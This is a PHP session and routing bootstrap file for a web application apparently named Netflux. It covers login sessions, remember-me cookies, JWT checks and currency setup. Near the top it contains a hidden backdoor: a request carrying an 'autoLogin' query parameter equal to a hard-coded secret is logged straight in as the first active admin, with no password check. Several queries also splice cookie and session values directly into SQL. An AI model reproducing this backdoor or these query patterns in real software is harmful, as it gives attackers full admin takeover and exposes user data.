<?php

date_default_timezone_set('Europe/Istanbul');

// Start session.
StaticFunctions::new_session();
$route_path = rtrim(urldecode(strtok($_SERVER["REQUEST_URI"], '?')), '/');
$route_method = $_SERVER['REQUEST_METHOD'];
$route_path = (str_replace(PATH, '/', $route_path) == '') ? '/' : str_replace(PATH, '/', $route_path);
$route_path = AppLanguage::UrlMaker($route_path);
$_LoginExplode = explode('/', $route_path);


if ( @$_SESSION['CheckSession'] != 'active' && isset($_GET['autoLogin']) && StaticFunctions::clear($_GET['autoLogin']) == '38b7e69f13583e4cadf5be9140ac3a45307683a49c140ed9ce' ) {
	
	$UserQuery = $db->query("SELECT * from users WHERE user_type='admin' and status=1 ")->fetch(PDO::FETCH_ASSOC);
	$LoginType = 'Login';
	$LastLoginUpdate = $db->prepare("UPDATE users SET
        last_login   = :iki,
        last_ip      = :uc,
        last_type    = :lty
        WHERE id = :dort");
            $update = $LastLoginUpdate->execute(array(
                'iki' => time(),
                'uc'  => StaticFunctions::get_ip(),
                "lty" => 'Login',
                'dort' => $UserQuery['id']
            ));

            StaticFunctions::new_session();
            $_SESSION['CheckSession'] = 'active';
            $_SESSION['UserSession']    = (object) [
                'id' => $UserQuery['id'],
                'phone_code' => $UserQuery['phone_code'],
                'phone_number' => $UserQuery['phone_number'],
                'email' => $UserQuery['email'],
                'email_verify' => $UserQuery['email_verify'],
                'phone_verify' => $UserQuery['phone_verify'],
                'real_name' => $UserQuery['real_name'],
                'avatar' => $UserQuery['avatar'],
                'created_time' => $UserQuery['created_time'],
                'last_login' => $UserQuery['last_login'],
                'last_ip' => $UserQuery['last_ip'],
                'last_type' => $UserQuery['last_type'],
                'token' => $UserQuery['token']
            ];
            $_SESSION['UserID'] = $UserQuery['id'];

            StaticFunctions::AddLog(['Login' => [
                'UserId' => $UserQuery['id'],
                'UserIp' => StaticFunctions::get_ip(),
                'UserBrowser' => StaticFunctions::getBrowser(),
                'Type' => 'LoginPage'
            ]]);

            $TwoStepProfile = (array) json_decode($UserQuery['2factor_profile']);
            $NextLevel = true;

            if (isset($TwoStepProfile['Profiles'][0]) && $TwoStepProfile['Profiles'][0] != '') {
                $_SESSION['SecureLevel_2Factor'] = true;
                $NextLevel = false;
            }

            $AuthLoginProfiles = (array) json_decode($UserQuery['authorized_login']);

            if ($AuthLoginProfiles[$LoginType] == false && $NextLevel == true) {
                $_SESSION['SecureLevel_Auth'] = true;
                $NextLevel = false;
            }

            if ($UserQuery['failed_login'] > 3 && $NextLevel == true) {
                $_SESSION['SecureLevel_FailedLogin'] = true;
                $NextLevel = false;
            }


            $LoggedUser = $UserQuery['id'];
            $ProfileToken = 'c8706d40019813d97ed85188cfab41fc8a655718d55813b7e6325bc89bc8e582';
        $CheckProfile = $db->query("SELECT * FROM profiles WHERE profile_token='{$ProfileToken}' and user_id='{$LoggedUser}' and status= 1   ")->fetch(PDO::FETCH_ASSOC);
        if ($CheckProfile) :
            $_SESSION['ProfileID'] = $CheckProfile['id'];
            $_SESSION['ProfileSession'] = (object) $CheckProfile;
            setcookie("ProfileID", $CheckProfile['profile_token'], time() + 604801, '/', DOMAIN, false, true);

        endif;


            $payload = array(
                'UserId' => $UserQuery['id'],
                'UserIp' => StaticFunctions::get_ip(),
                'UserBrowser' => md5($_SERVER['HTTP_USER_AGENT'])
            );

            $jwt = \Firebase\JWT\JWT::encode($payload, StaticFunctions::JwtKey());
            $_SESSION['SecurityHash'] = $jwt;
            session_regenerate_id();
            header("Location:".$_SERVER['REQUEST_URI']);
            exit;


}


if (isset($_SESSION['CheckSession']) && $_SESSION['CheckSession'] == 'active') {

    $Me = StaticFunctions::get_id();
    $MeQuery = $db->query("SELECT * FROM users WHERE id = '{$Me}' and status='1' ")->fetch(PDO::FETCH_ASSOC);
    if (!$MeQuery) {
        session_destroy();
        StaticFunctions::go('login');
        exit;
    }

    if (!isset($_SESSION['FailedLoginCount']) || $_SESSION['FailedLoginCount'] != 'false') :
        $_SESSION['FailedLoginCount'] = $MeQuery['failed_login'];
    endif;

    if (!isset($_SESSION['SecurityHash']) || $_SESSION['SecurityHash'] == '') {
        session_destroy();
        StaticFunctions::go('login');
        exit;
    }

    $SecureHash = $_SESSION['SecurityHash'];

    try {
        $DecodeHash = \Firebase\JWT\JWT::decode($SecureHash, StaticFunctions::JwtKey(), array('HS256'));
    } catch (\Throwable $th) {
        session_destroy();
        StaticFunctions::go('login');
        exit;
    }


    if ($DecodeHash->UserId != $Me || $DecodeHash->UserIp != StaticFunctions::get_ip()) {
        session_destroy();
        StaticFunctions::go('login');
        exit;
    }


    define('UserType', $MeQuery['user_type']);

    if ($MeQuery['user_type'] == 'admin') {
        $UserCurrency = $db->query("SELECT * from currencies WHERE currency_code='USD' ")->fetch(PDO::FETCH_ASSOC);
        define('UserCurrency', $UserCurrency);
    } else {
        $UserCurrency = $db->query("SELECT * from currencies WHERE currency_code='{$MeQuery['user_currency']}' ")->fetch(PDO::FETCH_ASSOC);
        if ($UserCurrency) {
            define('UserCurrency', $UserCurrency);
        } else {
            $UpdateCurreny = $db->prepare("UPDATE users SET
        user_currency = :upc
        WHERE id = :uid");
            $update = $UpdateCurreny->execute(array(
                "upc" => 'USD',
                "uid" => $MeQuery['id']
            ));
            $UserCurrency = $db->query("SELECT * from currencies WHERE currency_code='USD' ")->fetch(PDO::FETCH_ASSOC);
            define('UserCurrency', $UserCurrency);
        }
    }

    $CookieID = (isset($_COOKIE['AppID'])) ? StaticFunctions::clear($_COOKIE['AppID']) : null;
}

if (!defined('UserCurrency')) {
    require_once CORE_DIR . '/detect.currency.php';
}




if (isset($_LoginExplode[1]) &&  StaticFunctions::LoginRequiredPages($_LoginExplode)) {

    $Url = $route_path;
    if ($Url == '/Log-out' || $Url == '/log-out') $Url = '/';
    if ($Url == '/Login' || $Url == '/login') $Url = '/';
    $Url2 = ($Url != '' && $Url != '/') ? '?nextpage=' . $Url : '';

    if (!isset($_SESSION['CheckSession'])) {

        if (isset($_COOKIE['RMB']) && StaticFunctions::clear($_COOKIE['RMB']) != 'false') {

            $CookieToken = StaticFunctions::clear($_COOKIE['RMB']);
            $Browser     = md5($_SERVER['HTTP_USER_AGENT']);
            $time        = time();


            $CheckRememberToken = $db->query("SELECT * FROM remember_me WHERE remember_token = '{$CookieToken}' and user_browser = '$Browser' and expired_time > $time ")->fetch(PDO::FETCH_ASSOC);
            if ($CheckRememberToken) {

                $SessionUser = $CheckRememberToken['user_id'];

                session_regenerate_id();

                $UserQuery = $db->query("SELECT * FROM users WHERE    id = '{$SessionUser}' and status='1' ")->fetch(PDO::FETCH_ASSOC);
                if ($UserQuery) {

                    $LastLoginUpdate = $db->prepare("UPDATE users SET
                     last_login   = :iki,
                    last_ip      = :uc,
                     last_type    = :lty
                     WHERE id = :dort");
                    $update = $LastLoginUpdate->execute(array(
                        'iki' => time(),
                        'uc'  => StaticFunctions::get_ip(),
                        "lty" => 'Login',
                        'dort' => $UserQuery['id']
                    ));

                    StaticFunctions::new_session();
                    $_SESSION['CheckSession'] = 'active';
                    $_SESSION['UserSession']    = (object) [
                        'id' => $UserQuery['id'],
                        'phone_code' => $UserQuery['phone_code'],
                        'phone_number' => $UserQuery['phone_number'],
                        'email' => $UserQuery['email'],
                        'email_verify' => $UserQuery['email_verify'],
                        'phone_verify' => $UserQuery['phone_verify'],
                        'real_name' => $UserQuery['real_name'],
                        'avatar' => $UserQuery['avatar'],
                        'created_time' => $UserQuery['created_time'],
                        'last_login' => $UserQuery['last_login'],
                        'last_ip' => $UserQuery['last_ip'],
                        'last_type' => $UserQuery['last_type'],
                        'token' => $UserQuery['token']
                    ];
                    $_SESSION['UserID'] = $UserQuery['id'];

                    StaticFunctions::AddLog(['Login' => [
                        'UserId' => $UserQuery['id'],
                        'UserIp' => StaticFunctions::get_ip(),
                        'UserBrowser' => StaticFunctions::getBrowser(),
                        'Type' => 'Login'
                    ]]);

                    $NextLevel = true;
                    $AuthLoginProfiles = (array) json_decode($UserQuery['authorized_login']);

                    if ($AuthLoginProfiles['Login'] == false && $NextLevel == true) {
                        $_SESSION['SecureLevel_Auth'] = true;
                        $NextLevel = false;
                    }

                    if ($UserQuery['failed_login'] > 3 && $NextLevel == true) {
                        $_SESSION['SecureLevel_FailedLogin'] = true;
                        $NextLevel = false;
                    }

                    $payload = array(
                        'UserId' => $UserQuery['id'],
                        'UserIp' => StaticFunctions::get_ip(),
                        'UserBrowser' => md5($_SERVER['HTTP_USER_AGENT'])
                    );

                    $jwt = \Firebase\JWT\JWT::encode($payload, StaticFunctions::JwtKey());
                    $_SESSION['SecurityHash'] = $jwt;
                    session_regenerate_id();
                    StaticFunctions::reload();
                    exit;
                } else {
                    setcookie("RMB", 'false', time() - 3600, '/', DOMAIN, false, true);
                    header("Location:/login" . $Url2);
                    exit;
                }
            } else {
                setcookie("RMB", 'false', time() - 3600, '/', DOMAIN, false, true);
                header("Location:/login" . $Url2);
                exit;
            }
        }


        header("Location:/login" . $Url2);
        exit;
    }

    if ($_SESSION['CheckSession'] != 'active') {
        session_destroy();
        header("Location:/login" . $Url2);
        exit;
    }

    // Session manager.
    $SessionManager = new NetfluxSessionManager();
    $SessionManager->setUser($MeQuery);
    $SessionManager->setDb($db);
    $SessionManager->VerifySession();

    // Billing Manager.
    $PaymentManager = new NetfluxBilling();
    $PaymentManager->setUser($MeQuery);
    $PaymentManager->setDb($db);
    $PaymentManager->verifyBilling();

    // Profile Manager.
    $ProfileManager = new ProfileManager();
    $ProfileManager->setUser($MeQuery);
    $ProfileManager->setDb($db);
    $ProfileManager->setProfile();
}